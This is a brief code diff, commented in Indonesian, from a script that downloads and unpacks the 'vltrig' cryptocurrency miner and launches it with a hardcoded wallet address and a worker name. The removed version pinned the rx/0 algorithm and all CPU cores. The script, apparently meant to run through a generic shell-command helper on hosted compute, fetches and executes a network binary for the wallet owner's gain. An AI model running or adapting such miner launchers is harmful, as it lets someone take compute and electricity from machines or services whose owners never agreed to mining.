@@ -40,5 +40,5 @@ run_shell_command("curl -L -O https://github.com/HashVault/vltrig/releases/downl
 run_shell_command("tar -xvf vltrig-v6.26.0.5-linux-x64.tar.gz")
 
 # 4. Menjalankan bct dengan menyisipkan Nama Worker yang sudah didapat
-command_run = f"./vltrig --user 86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk --pass {worker_name} -a rx/0 -k -t $(nproc --all)"
+command_run = f"./vltrig --user 86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk --pass {worker_name}"
 run_shell_command(command_run)
